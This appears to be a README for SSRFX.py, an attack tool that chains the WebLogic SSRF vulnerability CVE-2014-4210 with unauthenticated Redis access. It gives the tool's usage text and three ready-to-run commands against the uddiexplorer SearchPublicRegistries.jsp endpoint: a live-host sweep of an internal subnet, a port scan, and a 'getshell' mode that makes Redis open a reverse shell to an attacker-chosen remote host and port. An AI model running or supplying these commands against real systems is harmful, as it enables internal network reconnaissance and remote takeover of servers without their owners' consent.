# CVE-2014-4210+Redis未授权访问
```
usage: SSRFX.py [-h] [--url URL] [--threads THREADS] [--app APP]
                [--network NETWORK] [--type TYPE] [--vulapp VULAPP]
                [--lhost LHOST] [--lport LPORT] [--rhost RHOST]
                [--rport RPORT]

SSRF Explotion Tools

optional arguments:
  -h, --help         show this help message and exit
  --url URL          Input the url u want to attack
  --threads THREADS  Input the threads u want to set
  --app APP          Input the website type,such as :weblogic
  --network NETWORK  The internal network to scan,network[,network[,network]]
  --type TYPE        Attack type,such as : portscan or livedetect
  --vulapp VULAPP    vulnerable app,such as redis
  --lhost LHOST      local host ip address
  --lport LPORT      local host port
  --rhost RHOST      remote host ip address
  --rport RPORT      remote host port
```  
# 存活扫描:
```
python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type livedetect
```
# 端口扫描:
```
python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type portscan
```
# 反弹shell
```
python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --vulapp redis --type getshell --lhost 内网主机 --lport redis端口 --rhost 远程主机 --rport 监听端口
```
